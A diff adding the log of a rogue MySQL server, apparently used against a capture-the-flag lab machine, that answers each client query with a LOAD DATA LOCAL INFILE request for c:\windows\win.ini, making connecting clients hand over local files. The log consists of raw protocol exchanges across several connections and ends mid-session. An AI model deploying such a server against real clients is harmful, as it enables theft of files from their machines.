@@ -1,0 +1,1948 @@
+2020-06-20 23:06:45,981:INFO:Conn from: ('10.10.10.187', 42776)
+2020-06-20 23:06:45,981:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-20 23:06:46,029:DEBUG:Data recved: '9\x00\x00'
+2020-06-20 23:06:46,029:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-20 23:06:46,030:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:06:46,030:INFO:Last packet
+2020-06-20 23:06:46,097:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:06:46,097:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:06:46,097:INFO:Query
+2020-06-20 23:06:46,098:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:06:46,144:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:06:46,145:DEBUG:Data recved: '\x02'
+2020-06-20 23:06:46,145:INFO:-- result
+2020-06-20 23:06:46,145:INFO:Result: '\x02'
+2020-06-20 23:06:46,145:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:06:46,145:INFO:Last packet
+2020-06-20 23:06:46,191:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:06:46,191:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:06:46,191:INFO:Query
+2020-06-20 23:06:46,191:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:06:46,238:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:06:46,238:DEBUG:Data recved: '\x02'
+2020-06-20 23:06:46,238:INFO:-- result
+2020-06-20 23:06:46,238:INFO:Result: '\x02'
+2020-06-20 23:06:46,238:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:06:46,238:INFO:Last packet
+2020-06-20 23:06:46,284:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:06:46,285:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:06:46,285:INFO:Query
+2020-06-20 23:06:46,285:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:06:46,331:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:06:46,331:DEBUG:Data recved: '\x02'
+2020-06-20 23:06:46,331:INFO:-- result
+2020-06-20 23:06:46,331:INFO:Result: '\x02'
+2020-06-20 23:06:46,332:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:06:46,332:INFO:Last packet
+2020-06-20 23:06:46,377:DEBUG:Data recved: '.\x00\x00'
+2020-06-20 23:06:46,377:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-20 23:06:46,378:INFO:Query
+2020-06-20 23:06:46,378:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:06:46,454:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:06:46,454:DEBUG:Data recved: '\x02'
+2020-06-20 23:06:46,454:INFO:-- result
+2020-06-20 23:06:46,454:INFO:Result: '\x02'
+2020-06-20 23:06:46,455:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:06:46,455:INFO:Last packet
+2020-06-20 23:06:46,501:DEBUG:Data recved: '\x0e\x00\x00'
+2020-06-20 23:06:46,502:DEBUG:Data recved: '\x00\x03SELECT USER()'
+2020-06-20 23:06:46,502:INFO:Query
+2020-06-20 23:06:46,502:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:06:46,548:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:06:46,548:DEBUG:Data recved: '\x02'
+2020-06-20 23:06:46,548:INFO:-- result
+2020-06-20 23:06:46,548:INFO:Result: '\x02'
+2020-06-20 23:06:46,548:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:06:46,548:INFO:Last packet
+2020-06-20 23:06:46,642:INFO:Conn from: ('10.10.10.187', 42778)
+2020-06-20 23:06:46,642:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-20 23:06:46,692:DEBUG:Data recved: '9\x00\x00'
+2020-06-20 23:06:46,692:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-20 23:06:46,692:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:06:46,692:INFO:Last packet
+2020-06-20 23:06:46,744:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:06:46,744:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:06:46,744:INFO:Query
+2020-06-20 23:06:46,744:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:06:46,792:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:06:46,792:DEBUG:Data recved: '\x02'
+2020-06-20 23:06:46,792:INFO:-- result
+2020-06-20 23:06:46,792:INFO:Result: '\x02'
+2020-06-20 23:06:46,792:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:06:46,792:INFO:Last packet
+2020-06-20 23:06:46,840:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:06:46,841:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:06:46,841:INFO:Query
+2020-06-20 23:06:46,841:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:06:46,889:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:06:46,889:DEBUG:Data recved: '\x02'
+2020-06-20 23:06:46,889:INFO:-- result
+2020-06-20 23:06:46,889:INFO:Result: '\x02'
+2020-06-20 23:06:46,889:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:06:46,889:INFO:Last packet
+2020-06-20 23:06:46,936:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:06:46,936:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:06:46,936:INFO:Query
+2020-06-20 23:06:46,936:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:06:46,986:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:06:46,986:DEBUG:Data recved: '\x02'
+2020-06-20 23:06:46,986:INFO:-- result
+2020-06-20 23:06:46,986:INFO:Result: '\x02'
+2020-06-20 23:06:46,986:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:06:46,987:INFO:Last packet
+2020-06-20 23:06:47,032:DEBUG:Data recved: '.\x00\x00'
+2020-06-20 23:06:47,033:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-20 23:06:47,033:INFO:Query
+2020-06-20 23:06:47,033:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:06:47,081:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:06:47,082:DEBUG:Data recved: '\x02'
+2020-06-20 23:06:47,082:INFO:-- result
+2020-06-20 23:06:47,082:INFO:Result: '\x02'
+2020-06-20 23:06:47,082:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:06:47,082:INFO:Last packet
+2020-06-20 23:06:47,130:DEBUG:Data recved: '\x17\x00\x00'
+2020-06-20 23:06:47,130:DEBUG:Data recved: '\x00\x03SELECT CONNECTION_ID()'
+2020-06-20 23:06:47,130:INFO:Query
+2020-06-20 23:06:47,131:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:06:47,178:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:06:47,178:DEBUG:Data recved: '\x02'
+2020-06-20 23:06:47,178:INFO:-- result
+2020-06-20 23:06:47,178:INFO:Result: '\x02'
+2020-06-20 23:06:47,178:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:06:47,178:INFO:Last packet
+2020-06-20 23:06:47,226:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:06:47,226:DEBUG:Data recved: '\x00\x03SHOW DATABASES'
+2020-06-20 23:06:47,226:INFO:Query
+2020-06-20 23:06:47,226:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:06:47,272:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:06:47,272:DEBUG:Data recved: '\x02'
+2020-06-20 23:06:47,272:INFO:-- result
+2020-06-20 23:06:47,272:INFO:Result: '\x02'
+2020-06-20 23:06:47,272:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:06:47,272:INFO:Last packet
+2020-06-20 23:06:47,318:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-20 23:06:47,318:DEBUG:Data recved: '\x00\x01'
+2020-06-20 23:06:47,318:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-20 23:06:47,318:DEBUG:Data recved: '\x00\x01'
+2020-06-20 23:09:01,471:INFO:Conn from: ('10.10.10.187', 42780)
+2020-06-20 23:09:01,471:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-20 23:09:01,519:DEBUG:Data recved: '9\x00\x00'
+2020-06-20 23:09:01,519:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-20 23:09:01,519:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:09:01,519:INFO:Last packet
+2020-06-20 23:09:01,566:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:09:01,566:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:09:01,566:INFO:Query
+2020-06-20 23:09:01,566:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:09:01,638:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:09:01,638:DEBUG:Data recved: '\x02'
+2020-06-20 23:09:01,638:INFO:-- result
+2020-06-20 23:09:01,638:INFO:Result: '\x02'
+2020-06-20 23:09:01,638:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:09:01,638:INFO:Last packet
+2020-06-20 23:09:01,686:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:09:01,686:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:09:01,686:INFO:Query
+2020-06-20 23:09:01,686:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:09:01,758:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:09:01,758:DEBUG:Data recved: '\x02'
+2020-06-20 23:09:01,758:INFO:-- result
+2020-06-20 23:09:01,758:INFO:Result: '\x02'
+2020-06-20 23:09:01,758:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:09:01,758:INFO:Last packet
+2020-06-20 23:09:01,808:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:09:01,808:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:09:01,808:INFO:Query
+2020-06-20 23:09:01,808:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:09:01,876:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:09:01,877:DEBUG:Data recved: '\x02'
+2020-06-20 23:09:01,877:INFO:-- result
+2020-06-20 23:09:01,877:INFO:Result: '\x02'
+2020-06-20 23:09:01,877:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:09:01,877:INFO:Last packet
+2020-06-20 23:09:01,933:DEBUG:Data recved: '.\x00\x00'
+2020-06-20 23:09:01,933:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-20 23:09:01,933:INFO:Query
+2020-06-20 23:09:01,933:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:09:01,995:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:09:01,996:DEBUG:Data recved: '\x02'
+2020-06-20 23:09:01,996:INFO:-- result
+2020-06-20 23:09:01,996:INFO:Result: '\x02'
+2020-06-20 23:09:01,996:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:09:01,996:INFO:Last packet
+2020-06-20 23:09:02,047:DEBUG:Data recved: '\x0e\x00\x00'
+2020-06-20 23:09:02,047:DEBUG:Data recved: '\x00\x03SELECT USER()'
+2020-06-20 23:09:02,047:INFO:Query
+2020-06-20 23:09:02,047:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:09:02,096:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:09:02,096:DEBUG:Data recved: '\x02'
+2020-06-20 23:09:02,096:INFO:-- result
+2020-06-20 23:09:02,096:INFO:Result: '\x02'
+2020-06-20 23:09:02,096:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:09:02,096:INFO:Last packet
+2020-06-20 23:09:02,193:INFO:Conn from: ('10.10.10.187', 42782)
+2020-06-20 23:09:02,193:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-20 23:09:02,241:DEBUG:Data recved: '9\x00\x00'
+2020-06-20 23:09:02,241:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-20 23:09:02,241:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:09:02,241:INFO:Last packet
+2020-06-20 23:09:02,289:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:09:02,289:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:09:02,289:INFO:Query
+2020-06-20 23:09:02,289:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:09:02,335:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:09:02,335:DEBUG:Data recved: '\x02'
+2020-06-20 23:09:02,335:INFO:-- result
+2020-06-20 23:09:02,335:INFO:Result: '\x02'
+2020-06-20 23:09:02,335:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:09:02,335:INFO:Last packet
+2020-06-20 23:09:02,381:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:09:02,381:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:09:02,381:INFO:Query
+2020-06-20 23:09:02,381:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:09:02,427:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:09:02,427:DEBUG:Data recved: '\x02'
+2020-06-20 23:09:02,427:INFO:-- result
+2020-06-20 23:09:02,427:INFO:Result: '\x02'
+2020-06-20 23:09:02,427:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:09:02,428:INFO:Last packet
+2020-06-20 23:09:02,473:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:09:02,474:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:09:02,474:INFO:Query
+2020-06-20 23:09:02,474:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:09:02,519:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:09:02,520:DEBUG:Data recved: '\x02'
+2020-06-20 23:09:02,520:INFO:-- result
+2020-06-20 23:09:02,520:INFO:Result: '\x02'
+2020-06-20 23:09:02,520:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:09:02,520:INFO:Last packet
+2020-06-20 23:09:02,565:DEBUG:Data recved: '.\x00\x00'
+2020-06-20 23:09:02,566:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-20 23:09:02,566:INFO:Query
+2020-06-20 23:09:02,566:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:09:02,612:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:09:02,613:DEBUG:Data recved: '\x02'
+2020-06-20 23:09:02,613:INFO:-- result
+2020-06-20 23:09:02,613:INFO:Result: '\x02'
+2020-06-20 23:09:02,614:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:09:02,614:INFO:Last packet
+2020-06-20 23:09:02,661:DEBUG:Data recved: '\x17\x00\x00'
+2020-06-20 23:09:02,661:DEBUG:Data recved: '\x00\x03SELECT CONNECTION_ID()'
+2020-06-20 23:09:02,661:INFO:Query
+2020-06-20 23:09:02,661:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:09:02,712:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:09:02,712:DEBUG:Data recved: '\x02'
+2020-06-20 23:09:02,712:INFO:-- result
+2020-06-20 23:09:02,713:INFO:Result: '\x02'
+2020-06-20 23:09:02,713:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:09:02,713:INFO:Last packet
+2020-06-20 23:09:02,759:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:09:02,759:DEBUG:Data recved: '\x00\x03SHOW DATABASES'
+2020-06-20 23:09:02,759:INFO:Query
+2020-06-20 23:09:02,759:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:09:02,807:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:09:02,808:DEBUG:Data recved: '\x02'
+2020-06-20 23:09:02,808:INFO:-- result
+2020-06-20 23:09:02,808:INFO:Result: '\x02'
+2020-06-20 23:09:02,808:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:09:02,808:INFO:Last packet
+2020-06-20 23:09:02,858:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-20 23:09:02,858:DEBUG:Data recved: '\x00\x01'
+2020-06-20 23:09:02,858:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-20 23:09:02,858:DEBUG:Data recved: '\x00\x01'
+2020-06-20 23:16:15,894:INFO:Conn from: ('10.10.10.187', 42784)
+2020-06-20 23:16:15,894:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-20 23:16:15,940:DEBUG:Data recved: '9\x00\x00'
+2020-06-20 23:16:15,941:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-20 23:16:15,941:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:16:15,941:INFO:Last packet
+2020-06-20 23:16:15,987:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:16:15,987:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:16:15,987:INFO:Query
+2020-06-20 23:16:15,987:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:16:16,033:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:16:16,033:DEBUG:Data recved: '\x02'
+2020-06-20 23:16:16,033:INFO:-- result
+2020-06-20 23:16:16,033:INFO:Result: '\x02'
+2020-06-20 23:16:16,034:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:16:16,034:INFO:Last packet
+2020-06-20 23:16:16,080:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:16:16,080:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:16:16,080:INFO:Query
+2020-06-20 23:16:16,080:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:16:16,128:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:16:16,128:DEBUG:Data recved: '\x02'
+2020-06-20 23:16:16,128:INFO:-- result
+2020-06-20 23:16:16,128:INFO:Result: '\x02'
+2020-06-20 23:16:16,128:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:16:16,128:INFO:Last packet
+2020-06-20 23:16:16,176:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:16:16,176:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:16:16,176:INFO:Query
+2020-06-20 23:16:16,177:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:16:16,222:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:16:16,223:DEBUG:Data recved: '\x02'
+2020-06-20 23:16:16,223:INFO:-- result
+2020-06-20 23:16:16,223:INFO:Result: '\x02'
+2020-06-20 23:16:16,223:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:16:16,223:INFO:Last packet
+2020-06-20 23:16:16,271:DEBUG:Data recved: '.\x00\x00'
+2020-06-20 23:16:16,271:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-20 23:16:16,271:INFO:Query
+2020-06-20 23:16:16,271:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:16:16,317:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:16:16,317:DEBUG:Data recved: '\x02'
+2020-06-20 23:16:16,317:INFO:-- result
+2020-06-20 23:16:16,317:INFO:Result: '\x02'
+2020-06-20 23:16:16,317:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:16:16,318:INFO:Last packet
+2020-06-20 23:16:16,364:DEBUG:Data recved: '\x0e\x00\x00'
+2020-06-20 23:16:16,364:DEBUG:Data recved: '\x00\x03SELECT USER()'
+2020-06-20 23:16:16,364:INFO:Query
+2020-06-20 23:16:16,364:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:16:16,411:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:16:16,411:DEBUG:Data recved: '\x02'
+2020-06-20 23:16:16,412:INFO:-- result
+2020-06-20 23:16:16,412:INFO:Result: '\x02'
+2020-06-20 23:16:16,412:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:16:16,412:INFO:Last packet
+2020-06-20 23:16:16,510:INFO:Conn from: ('10.10.10.187', 42786)
+2020-06-20 23:16:16,510:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-20 23:16:16,558:DEBUG:Data recved: '9\x00\x00'
+2020-06-20 23:16:16,559:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-20 23:16:16,559:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:16:16,559:INFO:Last packet
+2020-06-20 23:16:16,628:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:16:16,628:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:16:16,628:INFO:Query
+2020-06-20 23:16:16,628:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:16:16,678:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:16:16,679:DEBUG:Data recved: '\x02'
+2020-06-20 23:16:16,679:INFO:-- result
+2020-06-20 23:16:16,679:INFO:Result: '\x02'
+2020-06-20 23:16:16,679:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:16:16,679:INFO:Last packet
+2020-06-20 23:16:16,734:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:16:16,734:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:16:16,734:INFO:Query
+2020-06-20 23:16:16,734:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:16:16,782:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:16:16,782:DEBUG:Data recved: '\x02'
+2020-06-20 23:16:16,782:INFO:-- result
+2020-06-20 23:16:16,782:INFO:Result: '\x02'
+2020-06-20 23:16:16,782:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:16:16,782:INFO:Last packet
+2020-06-20 23:16:16,833:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:16:16,833:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:16:16,833:INFO:Query
+2020-06-20 23:16:16,833:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:16:16,879:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:16:16,879:DEBUG:Data recved: '\x02'
+2020-06-20 23:16:16,879:INFO:-- result
+2020-06-20 23:16:16,879:INFO:Result: '\x02'
+2020-06-20 23:16:16,879:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:16:16,879:INFO:Last packet
+2020-06-20 23:16:16,927:DEBUG:Data recved: '.\x00\x00'
+2020-06-20 23:16:16,927:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-20 23:16:16,927:INFO:Query
+2020-06-20 23:16:16,927:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:16:16,975:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:16:16,975:DEBUG:Data recved: '\x02'
+2020-06-20 23:16:16,975:INFO:-- result
+2020-06-20 23:16:16,975:INFO:Result: '\x02'
+2020-06-20 23:16:16,975:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:16:16,975:INFO:Last packet
+2020-06-20 23:16:17,022:DEBUG:Data recved: '\x17\x00\x00'
+2020-06-20 23:16:17,022:DEBUG:Data recved: '\x00\x03SELECT CONNECTION_ID()'
+2020-06-20 23:16:17,022:INFO:Query
